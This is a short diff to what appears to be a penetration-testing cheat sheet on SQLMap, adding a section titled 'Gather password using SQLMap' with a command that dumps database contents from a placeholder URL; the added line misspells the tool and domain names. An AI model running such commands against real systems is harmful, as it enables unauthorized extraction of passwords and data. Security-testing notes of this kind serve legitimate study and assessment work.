@@ -5,6 +5,11 @@
 sqlmap -u "http://domain.com"
 ```
 
+### Gather password using SQLMap
+```
+splmap -u "http://domian.com/index.php?something=something" --batch --dump
+```
+
 ### Identifying vulnerabilities with SQLMap
 ```
 # Intercept a login with burpsuite
